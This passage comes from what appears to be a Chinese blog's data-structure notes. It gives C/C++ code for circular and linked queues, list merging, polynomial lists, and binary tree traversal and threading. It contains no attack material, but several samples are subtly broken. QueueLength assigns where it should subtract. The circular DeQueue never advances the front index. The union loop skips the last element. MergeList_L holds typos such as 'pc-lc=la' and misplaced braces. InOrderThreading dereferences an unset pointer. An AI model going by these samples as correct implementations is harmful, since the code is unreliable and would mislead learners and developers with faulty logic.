class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//循环队列</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> M 100<span class="hljs-comment">//最大列长度</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">int</span> *base;<span class="hljs-comment">//初始化的动态分配存储</span><br><span class="hljs-type">int</span> front;<br><span class="hljs-type">int</span> rear;<br>&#125;SqQueue;<br><br><span class="hljs-comment">//循环队列初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(SqQueue &amp;Q)</span> &#123;<br>Q.base = new <span class="hljs-type">int</span>[M];<br><span class="hljs-keyword">if</span> (!Q.base)<span class="hljs-built_in">exit</span>(OVERFLOW);<br>Q.front = Q.rear = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//求循环队列的长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">QueueLength</span><span class="hljs-params">(SqQueue Q)</span> &#123;<br><span class="hljs-keyword">return</span> (Q.rear = Q.front + M) % M;<br>&#125;<br><br><span class="hljs-comment">//循环队列入队</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(SqQueue &amp;Q, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-keyword">if</span> ((Q.rear + <span class="hljs-number">1</span>) % M == Q.front)<span class="hljs-keyword">return</span> ERROR;<br>Q.base[Q.rear] = e;<br>Q.rear = (Q.rear + <span class="hljs-number">1</span>) % M;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//循环队列出队</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(SqQueue &amp;Q, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (Q.front == Q.rear)<span class="hljs-keyword">return</span> ERROR;<br>e = Q.base[Q.front];<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//********************************************************</span><br><span class="hljs-comment">//链队列</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;QNode,*QueuePtr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>QueuePtr front;<span class="hljs-comment">//队头指针</span><br>QueuePtr rear;<span class="hljs-comment">//队尾指针</span><br><br>&#125;LinkQueue;<br><br><span class="hljs-comment">//链队列初始化</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span> &#123;<br>Q.front = Q.rear = new QNode;<br><span class="hljs-keyword">if</span> (!Q.front)<span class="hljs-built_in">exit</span>(OVERFLOW);<br>Q.front-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//销毁链队列</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DestryQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span><br>&#123;<br><span class="hljs-keyword">while</span> (Q.front) &#123;<br>Q.rear = Q.front-&gt;next;<br>delete Q.front;<br>Q.front = Q.rear;<br>&#125;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//判断链队列是否为空</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">QueueEmpty</span><span class="hljs-params">(LinkQueue Q)</span><br>&#123;<br><span class="hljs-keyword">return</span> (Q.front == Q.rear);<br>&#125;<br><br><span class="hljs-comment">//求链队列的队头元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetHead</span><span class="hljs-params">(LinkQueue Q, <span class="hljs-type">int</span> e)</span><br>&#123;<br><span class="hljs-keyword">if</span> (Q.front == Q.rear)<span class="hljs-keyword">return</span> ERROR;<br>e = Q.front-&gt;next-&gt;data;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//链队列入队</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">EnQueue</span><span class="hljs-params">(LinkQueue &amp;Q, <span class="hljs-type">int</span> e)</span><br>&#123;<br>QNode *p;<br>p = new QNode;<br><span class="hljs-keyword">if</span> (!p)<span class="hljs-built_in">exit</span>(ERROR);<br>p-&gt;data = e;<br>p-&gt;next = <span class="hljs-literal">NULL</span>;<br>Q.rear-&gt;next = p;<br>Q.rear = p;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//链队列出队</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQueue &amp;Q, <span class="hljs-type">int</span> &amp;e)</span><br>&#123;<br>QNode *p;<br><span class="hljs-keyword">if</span> (Q.front == Q.rear)<span class="hljs-keyword">return</span> ERROR;<br>p = Q.front-&gt;next;<br>e = p-&gt;data;<br>Q.front-&gt;next = p-&gt;next;<br><span class="hljs-keyword">if</span> (Q.rear == p)Q.rear = Q.front;<br>delete p;<br><span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h1>链表的应用</h1><h3 id="线性表的合并">线性表的合并</h3><ul><li>A=A U B</li><li>依次取出Lb中的每个元素</li><li>在La中查找该元素</li><li>如果找不到，则将其插入La的最后</li><li>O(ListLength(La)*ListLength(Lb))</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">union</span><span class="hljs-params">(List &amp;La,List &amp;Lb)</span>&#123;<br>La_len=ListLength(La);<br>Lb_len=ListLength(Lb);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;Lb_len;i++)&#123;<br>GetElem(Lb,i,e);<br><span class="hljs-keyword">if</span>(!LocateElem(La,e))<br>ListInsert(&amp;La,++La_len,e);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="有序顺序表的合并">有序顺序表的合并</h3><ul><li>创建一个空表lc</li><li>依次从la或lb中摘取元素值较小的结点插入到lc表的最后，直至其中一个变为空为止</li><li>继续将la或lb其中一个表的剩余结点插入到lc表最后</li><li>O(ListLength(La)*ListLength(Lb))</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">MergeList_Sq</span><span class="hljs-params">(SqList la,SaList lb,SqList &amp;lc)</span>&#123;<br>pa=la.elem;<span class="hljs-comment">//pa、pb分别指向两表的第一个元素</span><br>pb=lb.elem;<br>lc.length=la.length+lb.length;<span class="hljs-comment">//新表长度为待合并两表的长度之和</span><br>lc.elem=new <span class="hljs-type">int</span>[lc.length];<span class="hljs-comment">//为合并后的新表分配一个数组空间</span><br>pc=lc.elem;<span class="hljs-comment">//指针pc指向新表的第一个元素</span><br>pa_last=la.elem+la.length<span class="hljs-number">-1</span>;<span class="hljs-comment">//指针pa_last指向la表的最后一个元素</span><br>pb_last=lb.elem+lb.length<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">while</span>(pa&lt;=pa_last&amp;&amp;pb&lt;=pb_last)&#123;<span class="hljs-comment">//两个表都非空</span><br><span class="hljs-keyword">if</span>(*pa&lt;=*pb)*pc++=*pa++;<span class="hljs-comment">//依次取两表中值较小的结点*a++等同于*(a++) 先a+1，然后取a所指的值</span><br><span class="hljs-keyword">else</span> *pc++=*pb++;<br>&#125;<br><span class="hljs-keyword">while</span>(pb&lt;=pb_last) *pc++=*pb++;<span class="hljs-comment">//lb表已到达结尾</span><br><span class="hljs-keyword">while</span>(pa&lt;=pa_last) *pc++=*pa++;<span class="hljs-comment">//la表已到达结尾   </span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="有序链表的合并">有序链表的合并</h3><ul><li>将两个有序链表合并成一个有序的单链表，表中允许有重复的数据，要求结果链表仍使用</li><li>来两个链表的存储空间，不占用其他的存储空间</li><li>lc指向la</li><li>依次从la或lb中取元素值较小的结点插入到lc表的最后，直到其中一个表变为空为止</li><li>继续将la或lb其中一个表剩余结点插入在lc表的最后</li><li>释放lb表的表头结点</li><li>O(ListLength(La)*ListLength(Lb))  S(n)=O(1)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">MergeList_L</span><span class="hljs-params">(linklist &amp;la,linklist &amp;lb,linklist &amp;lc)</span>&#123;<br>pa=la-&gt;next;<br>pb=lb-&gt;next;<br>pc-lc=la;<span class="hljs-comment">//用la头结点作为lc的头结点</span><br><span class="hljs-keyword">while</span>(pa&amp;&amp;pb)&#123;<br><span class="hljs-keyword">if</span>(pa-&gt;data&lt;=pb-&gt;data)&#123;pc-&gt;next=pa; pc=pa; pa=pa-&gt;next;&#125;<br><span class="hljs-keyword">else</span>&#123;pc-&gt;next=pb; pc-pb; pb=pb-&gt;next;&#125;<br>pc-&gt;next=pa?pa:pb;<span class="hljs-comment">//插入剩余段</span><br>delete lb;<span class="hljs-comment">//释放lb的头结点</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="稀疏多项式的运算">稀疏多项式的运算</h3><ul><li><p>思路：</p><ul><li>创建一个新数组c</li><li>分别从头遍历比较a和b的每一项<ul><li>指数相同，对应系数相加，若其和不为0，则在c中增加一个新项</li><li>指数不相同，则将指数较小的项复制到c中</li></ul></li><li>一个多项式遍历完毕时，将另一个剩余项依此复制到c中</li><li>（顺序存储结构存在的问题：存储空间分配不灵活，运算的空间复杂度高）</li></ul></li><li><p>算法步骤：</p><ul><li>创建一个只有头结点的空链表</li><li>根据多项式的个数n，循环n词执行以下操作：<ul><li>生成一个新结点 * s</li><li>输入多项式当前项的系数和指数赋给新结点* s的数据域</li><li>设置一前驱指针pre，用于指向待找到的第一个大于输入项指数的结点的前驱，pre初值指向头结点</li><li>指针q初始化，指向首元结点</li><li>循链向下逐个比较链表中当前结点与输入项指数，找到第一个大于输入项指数的结点* q</li><li>将输入项结点* s插入到结点* q之前</li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">float</span> coef;<span class="hljs-comment">//系数</span><br><span class="hljs-type">int</span> expn;<span class="hljs-comment">//指数</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PNode</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指针域</span><br>&#125;PNode,*Polynomial;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreatePolyn</span><span class="hljs-params">(Polynomaial &amp;P,<span class="hljs-type">int</span> n)</span>&#123;  <span class="hljs-comment">//输入n项的系数和指数，建立表示多项式的有序链表</span><br>P=new PNode;<br>P-&gt;next=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//先建立一个带头结点的单链表</span><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=n;++i)<span class="hljs-comment">//依次输入n个非零项</span><br>&#123;<br>s=new PNode;<span class="hljs-comment">//生成新结点</span><br><span class="hljs-built_in">cin</span>&gt;&gt;s-&gt;coef&gt;&gt;s-&gt;expn;<span class="hljs-comment">//输入系数和指数</span><br>pre=P;<span class="hljs-comment">//pre用于保存q的前驱，初值为头结点</span><br>q=P-&gt;next;<span class="hljs-comment">//q初始化，指向首元结点</span><br><span class="hljs-keyword">while</span>(q&amp;&amp;q-&gt;expn&lt;s-&gt;expn)<span class="hljs-comment">//找到第一个大于输入项指数的项*q</span><br>&#123;<br>pre=q;<br>q=q-&gt;next;<br>&#125;<br>s-&gt;next=q;<span class="hljs-comment">//将输入项s插入到q和其前驱结点pre之间</span><br>pre-&gt;next=s;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>code-树和二叉树</title>
    <link href="/2022/02/18/code-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2022/02/18/code-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1>遍历</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">//二叉链表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125;BiNode,*BiTree;<br><br><span class="hljs-comment">//三叉链表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TriTNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TriTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">parent</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125;TtiTNode,*TriTree;<br><br><span class="hljs-comment">//先序遍历建立二叉树</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBiTree</span><span class="hljs-params">(BiTree &amp;T)</span> &#123;<br><span class="hljs-type">char</span> ch;<br>scanf_s(&amp;ch);<br><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;#&#x27;</span>)T = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (!(T = (BiNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode))))<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>T-&gt;data = ch;<br>CreateBiTree(T-&gt;lchild);<br>CreateBiTree(T-&gt;rchild);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//先序遍历</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">PreOderTraverse</span><span class="hljs-params">(BiTree T)</span> &#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">//空二叉树</span><br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,T-&gt;data);<br>PreOderTraverse(T-&gt;lchild);<span class="hljs-comment">//递归遍历左子树</span><br>PreOderTraverse(T-&gt;rchild);<span class="hljs-comment">//递归遍历右子树</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//中序遍历</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InOderTraverse</span><span class="hljs-params">(BiTree T)</span> &#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br>InOderTraverse(T-&gt;lchild);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, T-&gt;data);<br>InOderTraverse(T-&gt;rchild);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//后序遍历</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">PostOrderTraverse</span><span class="hljs-params">(BiTree T)</span> &#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br>PostOrderTraverse(T-&gt;lchild);<br>PostOrderTraverse(T-&gt;rchild);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,T-&gt;data);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1>计算</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//计算二叉树结点总数</span><br><span class="hljs-comment">//如果是空树，则结点个数为0，否则结点个数为左子树结点个数+右子树结点个数+1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">NodeCount</span><span class="hljs-params">(BiTree T)</span> &#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//计算二叉树的深度</span><br><span class="hljs-comment">//如果是空树，则深度为0,</span><br><span class="hljs-comment">//否则，递归计算左子树的深度记为m，递归计算右子树的深度记为n，</span><br><span class="hljs-comment">//二叉树的深度则为m与n的较大者加1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Depth</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-type">int</span> m,n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//如果是空树，深度为0</span><br><span class="hljs-keyword">else</span><br>&#123;<br>m = Depth(T-&gt;lchild);<span class="hljs-comment">//递归计算左子树的深度为m</span><br>n = Depth(T-&gt;rchild);<span class="hljs-comment">//递归计算右子树的深度为n</span><br><span class="hljs-keyword">if</span> (m &gt; n)<span class="hljs-keyword">return</span>(m + <span class="hljs-number">1</span>);<span class="hljs-comment">//较大者+1</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span>(n + <span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//二叉树的二叉线索表示</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-type">int</span> Ltag, Rtag;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125;BiThrNode, *BiThrTree;<br></code></pre></td></tr></table></figure><h1>线索化</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//以结点p为根的子树中序线索化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InThreading</span><span class="hljs-params">(BiThrTree p)</span><br>&#123;<br><span class="hljs-comment">//pre是全局变量，初始化时其右孩子指针为空，便于在树的最左点开始建线索</span><br><span class="hljs-keyword">if</span> (p)<br>&#123;<br>InThreading(p-&gt;lchild);  <span class="hljs-comment">//左子树递归线索化</span><br><span class="hljs-keyword">if</span> (!p-&gt;lchild)<span class="hljs-comment">//p的左孩子为空</span><br>&#123;<br>p-&gt;Ltag = <span class="hljs-number">1</span>;   <span class="hljs-comment">//给p加上左线索</span><br>p-&gt;lchild = pre;<span class="hljs-comment">//p的左孩子指针指向pre（前驱）</span><br>&#125;<br><span class="hljs-keyword">else</span> p-&gt;Ltag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!pre-&gt;rchild)<span class="hljs-comment">//pre的右孩子为空</span><br>&#123;<br>pre-&gt;Rtag = <span class="hljs-number">1</span>;<span class="hljs-comment">//给pre加上右线索</span><br>pre-&gt;rchild = p;<span class="hljs-comment">//pre的右孩子指针指向p（后继）</span><br>&#125;<br><span class="hljs-keyword">else</span> pre-&gt;Rtag = <span class="hljs-number">0</span>;<br>pre = p;<span class="hljs-comment">//保持pre指向p的前驱</span><br>InThreading(p-&gt;rchild);<span class="hljs-comment">//右子树递归线索化</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//带头结点的二叉树中序线索化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderThreading</span><span class="hljs-params">(BiThrTree &amp;Thr, BiThrTree T)</span><br>&#123;<span class="hljs-comment">//中序遍历二叉树T,并将其中序线索化，Thrt指向头结点</span><br>BiThrTree Thrt = new BiThrNode;<br>Thrt-&gt;Ltag = <span class="hljs-number">0</span>;<span class="hljs-comment">//头结点有左孩子，若树非空，则其左孩子为树根</span><br>Thrt-&gt;Rtag = <span class="hljs-number">1</span>;<span class="hljs-comment">//头结点的右孩子指针为右线索</span><br>Thrt-&gt;rchild-&gt;lchild = Thrt;<span class="hljs-comment">//初始化时右指针指向自己</span><br><span class="hljs-keyword">if</span> (!T)Thrt-&gt;lchild = Thrt;<span class="hljs-comment">//若树为空，则指针也指向自己</span><br><span class="hljs-keyword">else</span><br>&#123;<br>Thrt-&gt;lchild = T;<span class="hljs-comment">//头结点的左孩子指向根，pre初值指向头结点</span><br>InThreading(T);<br><br>pre-&gt;rchild = Thrt;<br><br>pre-&gt;Rtag = <span class="hljs-number">1</span>;<br>Thrt-&gt;rchild = pre;<span class="hljs-comment">//头结点的右线索指向pre</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//遍历中序线索二叉树   时间复杂度:O(n) 空间复杂度：O(1),不需要使用栈来实现递归操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraverse_Thr</span><span class="hljs-params">(BiThrTree T)</span><br>&#123;<br>BiThrTree p = new BiThrNode;<br>p = T-&gt;lchild;<span class="hljs-comment">//T指向头结点，p指向根结点</span><br><span class="hljs-keyword">while</span> (p != T) &#123;<br><span class="hljs-keyword">while</span> (p-&gt;Ltag == <span class="hljs-number">0</span>)p = p-&gt;lchild;<span class="hljs-comment">//找到左子树为空的结点</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, p-&gt;data);<br><span class="hljs-keyword">while</span> (p-&gt;Rtag == <span class="hljs-number">1</span> &amp;&amp; p-&gt;rchild != T) &#123;<br>p = p-&gt;rchild;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, p-&gt;data);<br>&#125;<span class="hljs-comment">//继续访问后续结点</span><br>p = p-&gt;rchild;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1>其他表示法</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//双亲表示法</span><br><span 